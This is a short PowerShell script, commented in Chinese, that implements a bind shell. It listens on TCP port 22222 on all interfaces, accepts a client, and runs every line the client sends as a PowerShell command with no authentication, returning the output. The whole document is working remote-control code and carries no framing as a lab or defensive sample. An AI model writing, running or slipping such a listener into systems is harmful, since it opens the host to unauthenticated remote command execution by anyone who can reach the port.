$port = 22222
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, $port)

# 創建一個TCP伺服器並開始監聽連接
$server = New-Object System.Net.Sockets.TcpListener $endpoint
$server.Start()

# 接受連接請求
$client = $server.AcceptTcpClient()

# 檢查客戶端是否已成功連接
if (!$client.Connected) {
    Write-Error "Unable to connect to the client"
    exit 1
}

# 將TCP客戶端的流包裝成PowerShell的流
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter $stream
$reader = New-Object System.IO.StreamReader $stream

# 創建一個新的PowerShell運行時
$ps = [powershell]::Create()

# 設置一個從客戶端接收命令並執行的循環
while ($true) {
    $command = $reader.ReadLine()

    # 檢查連接是否中斷
    if ($reader.EndOfStream) {
        Write-Host "Connection interrupted"
        break
    }

    if ($command -eq "exit") { break }

    $result = $ps.AddScript($command).Invoke()
    $ps.Commands.Clear()

    if ($result) {
        $writer.WriteLine($result -join "`n")
    } else {
        $writer.WriteLine("")
    }
    $writer.Flush()
}

# 釋放資源
$writer.Close()
$reader.Close()
$stream.Close()
$client.Close()
$server.Stop()
